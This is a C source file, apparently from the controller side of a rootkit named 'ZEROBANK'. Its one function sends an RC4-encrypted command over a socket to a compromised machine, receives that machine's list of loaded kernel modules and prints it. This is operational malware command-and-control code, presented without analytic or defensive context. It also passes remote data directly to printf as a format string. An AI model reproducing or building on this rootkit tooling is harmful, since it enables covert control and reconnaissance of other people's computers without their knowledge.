#include "server_globals.h"

BOOLEAN rootkit_get_modules(IN SOCKET sock, IN BYTE PacketType)
{
	ZEROBANK_PACKET_TYPE typeofpacket = { 0 };
	INT sendsize = 0;
	INT recvsize = 0;
	PROOTKIT_MODULES_LIST_HEAD Entrybuffer = NULL;
	PROOTKIT_MODULES_ENTRY entry = NULL, buffer = NULL;
	ULONG getsize = 0;
	PVOID Out = NULL;
	ULONG NumberOfModules = 0;
	BOOLEAN ret;

	CHAR ImageBase[30] = { 0 };
	CHAR ModulePath[260] = { 0 };
	CHAR ModuleName[260] = { 0 };
	CHAR ImageSize[30] = { 0 };
	CHAR LoadOrderIndex[30] = { 0 };

	char *baseaddress = "ImageBase";
	char *path = "Path";
	char *module = "Name";
	char *size = "ImageSize";
	char *order = "LoadOrder";

	typeofpacket.PacketType = PacketType;
	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&typeofpacket, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{
		recvsize = recv(sock, (char*)&getsize, sizeof(ULONG), 0);
		if (recvsize > 0)
		{

			Out = recv_decrypted(sock, RC4_KEY_2, (PROOTKIT_MODULES_ENTRY)buffer, getsize);
			if (Out != NULL)
			{
				entry = (PROOTKIT_MODULES_ENTRY)Out;
				if (entry)
				{
					printf("\r\n");
					printf("\r\n%s %10s %30s %50s %10s", baseaddress, size, module, path, order);
					printf("\r\n");

					NumberOfModules = getsize / sizeof(ROOTKIT_MODULES_ENTRY);

					for (ULONG i = 0; i < NumberOfModules; i++, entry++)
					{
						wsprintfA(ImageBase, "\r\n0x%p", entry->ImageBase);
						wsprintfA(ImageSize, "%11lu", entry->ImageSize);
						wsprintfA(ModuleName, "%30s", entry->ModuleName);
						wsprintfA(ModulePath, "%50s", entry->ModulePath);
						wsprintfA(LoadOrderIndex, "%11lu", entry->LoadOrderIndex);

						printf(ImageBase);
						printf(ImageSize);
						printf(ModuleName);
						printf(ModulePath);
						printf(LoadOrderIndex);

						ret = TRUE;
					}
				}
				RtlFreeHeap(GetProcessHeap(), 0, Out);
				Out = NULL;
			}
		}
		else
		{
			printf("\r\n[!] Error receiving allocation bytes: %d", RtlGetLastWin32Error());
			ret = FALSE;
		}

	}

	else
	{
		printf("\r\n[!] Error sending packet type: %d",RtlGetLastWin32Error());
		ret = FALSE;
	}

	return ret;
}